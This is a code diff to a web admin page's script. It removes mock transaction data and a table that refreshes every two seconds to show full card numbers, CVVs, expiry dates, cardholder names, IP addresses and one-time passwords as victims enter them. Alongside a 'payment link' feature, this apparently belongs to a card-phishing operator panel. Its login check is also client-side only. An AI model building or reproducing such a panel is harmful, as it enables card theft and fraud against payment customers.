@@ -277,52 +277,12 @@
       showToast('Payment link copied to clipboard');
     }
 
-    // Mock Data
-    let transactions = [
-      {
-        id: 'tx' + Math.random().toString(36).substr(2, 9),
-        email: 'user@example.com',
-        amount: 1000,
-        currency: 'INR',
-        cardNumber: '4111111111111111',
-        cvv: '123',
-        expiry: '12/24',
-        cardholder: 'John Doe',
-        ip: '192.168.1.1',
-        status: 'processing'
-      }
-    ];
-
-    function loadTransactions() {
-      const tbody = document.querySelector("#transactionsTable tbody");
-      tbody.innerHTML = ''; // Clear existing rows
-      transactions.forEach(tx => {
-        const row = document.createElement('tr');
-        row.innerHTML = `
-          <td>${tx.id}</td>
-          <td>${tx.email}</td>
-          <td>${tx.amount}</td>
-          <td>${tx.currency}</td>
-          <td>${tx.cardNumber}</td>
-          <td>${tx.cvv}</td>
-          <td>${tx.expiry}</td>
-          <td>${tx.cardholder}</td>
-          <td>${tx.ip || 'N/A'}</td>
-          <td>${tx.otpEntered ? `<span class="otp-received">${tx.otpEntered}</span>` : 'Waiting for OTP'}</td>
-          <td><span class="status-badge status-${tx.status}">${tx.status}</span></td>
-        `;
-        tbody.appendChild(row);
-      });
-    }
-
     window.onload = function() {
       const loggedIn = localStorage.getItem('adminLoggedIn') === 'true';
       if (loggedIn) {
         document.getElementById('adminUser').textContent = validUsername;
         document.getElementById('loginForm').style.display = 'none';
         document.getElementById('adminContent').style.display = 'block';
-        loadTransactions();
-        setInterval(loadTransactions, 2000);
       }
     };
   </script>
